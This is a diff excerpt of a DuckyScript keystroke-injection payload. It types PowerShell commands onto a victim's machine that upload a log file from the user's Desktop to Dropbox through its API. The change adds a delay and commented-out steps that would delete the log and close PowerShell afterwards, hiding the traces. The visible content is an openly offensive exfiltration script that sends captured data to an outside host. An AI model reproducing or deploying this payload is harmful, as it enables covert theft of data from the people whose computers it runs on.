@@ -30,4 +30,13 @@ STRING $headers.Add("Content-Type", 'application/octet-stream')
 ENTER
 STRING $response = Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $env:USERPROFILE\Desktop\log.txt -Headers $headers
 ENTER
-REM DELETE log.txt from desktop
+DELAY 100
+REM bottom code with delete log.txt and exit powershell
+# STRING cd $env:USERPROFILE\Desktop
+# ENTER
+# DELAY 100
+# STRING del log.txt
+# ENTER
+# DELAY 100
+# STRING exit
+# ENTER
